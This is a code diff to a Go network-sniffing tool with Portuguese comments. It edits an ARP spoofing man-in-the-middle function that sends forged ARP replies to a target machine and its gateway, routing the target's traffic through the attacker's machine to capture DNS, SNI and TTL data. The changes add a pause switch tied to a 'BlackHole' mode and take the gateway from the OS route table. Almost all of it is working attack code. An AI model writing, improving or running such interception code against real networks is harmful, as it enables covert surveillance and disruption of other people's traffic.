@@ -8,6 +8,7 @@ import (
 	"sort"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/google/gopacket"
@@ -443,7 +444,8 @@ func (s *SnifferService) SniffNetwork(ctx context.Context) error {
 // ARPSpoofMitM executa o ataque de ARP Spoofing contra um alvo específico.
 // Isso força o tráfego do alvo a passar pela nossa máquina, permitindo
 // a captura de TTL, SNI, DNS e outros dados mesmo de máquinas em Modo Furtivo.
-func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string) error {
+// O parâmetro paused permite pausar o envenenamento ARP externamente (ex: quando BlackHole está ativo).
+func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, paused *atomic.Bool) error {
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Println("  [-] Erro ao buscar interfaces:", err)
@@ -483,15 +485,12 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 		return fmt.Errorf("erro ao recuperar detalhes da interface")
 	}
 
-	// Descobre o Gateway (primeiro IP da sub-rede)
-	_, ipNet, err := net.ParseCIDR(cidr)
-	if err != nil {
-		log.Println("  [-] Erro ao parsear CIDR:", err)
-		return err
+	// Descobre o Gateway via tabela de rotas do SO
+	gatewayIP := gatewayIPFromCIDROrOS(cidr)
+	if gatewayIP == nil {
+		log.Println("  [-] Erro: não foi possível determinar o gateway.")
+		return fmt.Errorf("não foi possível determinar o gateway")
 	}
-	gatewayIP := make(net.IP, len(ipNet.IP))
-	copy(gatewayIP, ipNet.IP)
-	gatewayIP[len(gatewayIP)-1] = 1 // Ex: 10.67.80.1
 
 	fmt.Printf("      Gateway:   %s\n", gatewayIP.String())
 
@@ -584,6 +583,11 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 			case <-ctx.Done():
 				return
 			default:
+				// Se estiver pausado (BlackHole ativo), não enviar ARPs de MitM
+				if paused != nil && paused.Load() {
+					time.Sleep(500 * time.Millisecond)
+					continue
+				}
 				// Diz ao ALVO: "O Gateway sou EU" (nosso MAC, IP do gateway)
 				_ = s.sendARPReply(poisonHandle, myMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
 				// Diz ao GATEWAY: "O Alvo sou EU" (nosso MAC, IP do alvo)
